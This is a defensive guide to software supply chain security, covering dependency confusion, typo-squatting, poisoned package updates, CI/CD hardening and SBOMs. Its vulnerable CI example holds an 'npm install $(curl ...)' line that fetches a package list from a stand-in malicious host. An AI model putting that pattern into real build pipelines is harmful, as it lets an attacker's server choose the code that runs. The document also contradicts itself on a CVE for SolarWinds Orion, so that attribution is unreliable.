# Supply Chain Security — Dependency Confusion, Typo-Squatting, Malicious Packages

**CWE:** CWE-1104 (Use of Unmaintained Third-Party Components), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**OWASP Top 10:2021:** A06 — Vulnerable and Outdated Components, A08 — Software and Data Integrity Failures
**OWASP Top 10:2025:** A03 — Software Supply Chain Failures (moved up significantly)

---

## What Is Supply Chain Vulnerability?

Supply chain attacks target the **trust relationship** between your application and its dependencies — the open-source packages, libraries, container images, and third-party services you rely on. Attackers compromise these dependencies to inject malicious code into your application.

**The impact:** Remote code execution, data exfiltration, backdoors, credential theft. A single compromised dependency can affect thousands of downstream applications.

## Why Vibe Coding Makes This Worse

AI code generators amplify supply chain risk in several ways:

- **AI recommends packages without vetting:** "Use package X" — but AI doesn't check if X has 10M downloads or 10 downloads (typo-squatting risk)
- **AI uses latest-version syntax:** Generates code that requires bleeding-edge versions that may not exist yet
- **AI writes npm/pip install commands:** Could suggest installing packages from suspicious sources
- **No lockfile management:** AI doesn't generate or explain the importance of `package-lock.json`, `requirements.txt` with hashes, or `go.sum`
- **Copy-paste from internet:** AI frequently generates code copied from Stack Overflow or GitHub gists — which attackers have been known to poison

---

## Common Supply Chain Attacks

### 1. Dependency Confusion

The attacker uploads a package with the same name as an **internal/private package** to a public registry. The package manager prefers the public version (higher version number) over the private one.

**How it works:**

```javascript
// Your private package.json references an internal package:
{
    "dependencies": {
        "@mycorp/internal-auth": "^1.0.0"  // Only exists in private registry
    }
}

// Attacker uploads "mycorp-internal-auth" (without @scope) to npm
// or "internal-auth" (without scope) — depends on package manager behavior
```

**Real attack:** In 2021, a researcher demonstrated dependency confusion against 35 major tech companies (Apple, Netflix, PayPal, Uber, Shopify) — many had private npm packages that could be hijacked by publishing to the public registry.

**Mitigation:**

```bash
# ✅ npm: scope-publish all internal packages
# .npmrc:
@mycorp:registry=https://private-registry.mycorp.com/

# ✅ Use yarn with --update-checksums
# ✅ pin exact versions and verify integrity
# package-lock.json with integrity hashes
```

### 2. Typo-Squatting

Attackers register packages with names similar to popular ones:

| Legitimate Package | Typo-Squatted |
|---|---|
| `lodash` (26M+/week) | `loodash`, `lodashh`, `lodahs` |
| `request` (deprecated) | `requiest`, `reqest` |
| `express` | `expresss`, `expreess` |
| `python-requests` | `python-requsts`, `requesys` |
| `bootstrap` | `bootstap`, `bootstrap4` |

**Detection:** Use tools like [npm-malware-scanner](https://github.com/nicepkg/npm-malware-scanner) or [Socket.dev](https://socket.dev/) to scan for suspicious packages.

### 3. Malicious Package Updates (Software Supply Chain Compromise)

Attackers compromise maintainer accounts or build pipelines to inject malicious code into legitimate updates.

**Famous Examples:**

| Attack | Year | Impact |
|---|---|---|
| **SolarWinds Orion** | 2020 | 18,000 orgs compromised via poisoned build update (CVE-2021-35215) |
| **Codecov Bash Uploader** | 2021 | Modified script exfiltrated environment variables from CI |
| **event-stream** (npm) | 2018 | Added malicious flatmap-stream that stole Bitcoin wallets |
| **UA-Parser-JS** | 2021 | Cryptominer injected into npm package with 7M weekly downloads |
| **colors.js / faker.js** | 2022 | Maintainer intentionally broke packages used by thousands of apps |

### 4. Compromised CI/CD Pipelines

Attackers target **build servers, package registries, and deployment tools** rather than source code.

**Vulnerable CI/CD Pattern:**
```yaml
# 🔴 VULNERABLE: CI runs arbitrary code from unverified sources
steps:
  - run: npm install $(curl https://malicious.example.com/package-list.txt)
  
# 🔴 VULNERABLE: no artifact signing
  - run: npm publish
```

**Secure CI/CD:**
```yaml
# ✅ SECURE: sign artifacts
  - run: |
      npm publish --sign
      gpg --detach-sign --armor myapp.tar.gz

# ✅ SECURE: verify dependency integrity before build
  - run: npm audit --audit-level=high
  - run: npm ci  # Uses lockfile
```

---

## Package Manager Security Comparison

| Manager | Lockfile | Integrity Check | Sig Verification | SBOM Support |
|---|---|---|---|---|
| **npm** | `package-lock.json` | ✅ Subresource Integrity | ❌ (proposal) | ✅ (via `npm sbom`) |
| **yarn** | `yarn.lock` | ✅ Checksum | ❌ | ✅ |
| **pnpm** | `pnpm-lock.yaml` | ✅ Checksum | ❌ | ✅ |
| **pip** | `requirements.txt` + hashes | ✅ via `--hash` | ❌ | ✅ (via pip-audit) |
| **Poetry** | `poetry.lock` | ✅ | ❌ | ✅ |
| **Go Modules** | `go.sum` | ✅ Checksum | ✅ (sumdb) | ✅ |
| **Cargo (Rust)** | `Cargo.lock` | ✅ Checksum | ❌ | ✅ |
| **Maven/Gradle** | (effective) | ✅ Checksum | ✅ (GPG) | ✅ (CycloneDX) |

---

## SBOM (Software Bill of Materials)

An SBOM is a formal, machine-readable inventory of all components in your software. Required by **US Executive Order 14028** for government software.

### Generating an SBOM

```bash
# npm
npm sbom --format=cyclonedx > sbom.json

# Go
go-sbom ./... > sbom.spdx.json

# Python (using CycloneDX)
pip install cyclonedx-bom
cyclonedx-py -i requirements.txt -o sbom.xml

# Generic (using Syft)
syft packages ./myapp --format cyclonedx-json > sbom.json
```

---

## Prevention Checklist for AI Prompts

```
✅ SUPPLY CHAIN REQUIREMENTS FOR THIS CODE:
- Pin exact dependency versions (no ^ or ~ ranges unless necessary)
- Always use lockfiles (package-lock.json, yarn.lock, Cargo.lock, go.sum)
- Verify package names carefully — watch for typo-squatting
- Use private registry with auth for internal packages
- Register all possible namespace variations of internal packages
- Run npm audit, pip-audit, or equivalent before each deployment
- Use dependency scanning tools (Snyk, Dependabot, Renovate, Socket.dev)
- Sign and verify release artifacts
- Maintain an SBOM for every release
- Review dependency licenses and maintainer reputation
- Use minimal base Docker images (distroless, Alpine)
- Don't install dev dependencies in production
- Set up binary repository manager (Nexus, Artifactory) for dependency caching
- Monitor CVE databases for all direct and transitive dependencies
```

### Automated Tooling

| Tool | Purpose |
|---|---|
| Dependabot / Renovate | Automated dependency updates |
| Snyk / Socket.dev | Vulnerability scanning + malware detection |
| npm audit / pip-audit | Registry-published vulnerability check |
| Trivy / Grype | Container and filesystem scanning |
| Syft | SBOM generation |
| Sigstore / Cosign | Artifact signing |
| OWASP Dependency-Check | Comprehensive dependency analysis |
| OpenSSF Scorecard | Evaluate open-source project security practices |

---

## Supply Chain Security Levels

| Level | Practices |
|---|---|
| **🥇 Level 3** | SBOM generation, artifact signing, dependency review, runtime monitoring, SLSA Level 3+ |
| **🥈 Level 2** | Lockfiles, version pinning, automated scanning, private registry, Dependabot |
| **🥉 Level 1** | Lockfiles, `npm audit`, known vuln scanning |
| **❌ None** | No lockfiles, wide version ranges, no scanning |

---

## Real-World CVEs

| Vulnerability | CVE | Impact |
|---|---|---|
| SolarWinds Orion backdoor (SUNBURST) | N/A (malicious build injection / no classic CVE) | Supply chain RCE — ~18K orgs |
| Codecov Bash Uploader | N/A (compromised CI script / no CVE) | Credential/env-var exfiltration from CI |
| UA-Parser-JS cryptominer | N/A (malicious package / hijacked maintainer account) | Cryptominer in a 7M+ weekly-download package |
| event-stream / flatmap-stream | N/A (malicious package) | Bitcoin wallet theft |
| colors.js / faker.js sabotage | N/A (maintainer self-sabotage / no CVE) | Breaking change to thousands of apps |
| XZ Utils / liblzma backdoor | CVE-2024-3094 | Hidden backdoor injected into build; enabled SSH compromise |
| log4j JNDI injection (Log4Shell) | CVE-2021-44228 | RCE via vulnerable logging dependency |

---

## References

- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)
- [OWASP CycloneDX SBOM Standard](https://cyclonedx.org/)
- [CISA — Software Supply Chain Security](https://www.cisa.gov/software-supply-chain-security)
- [Google SLSA Framework](https://slsa.dev/)
- [OpenSSF Scorecard](https://securityscorecards.dev/)
- [NIST SP 800-161 — Supply Chain Risk Management](https://csrc.nist.gov/publications/detail/sp/800-161/rev-1/final)
- [CWE-1104: Use of Unmaintained Third-Party Components](https://cwe.mitre.org/data/definitions/1104.html)
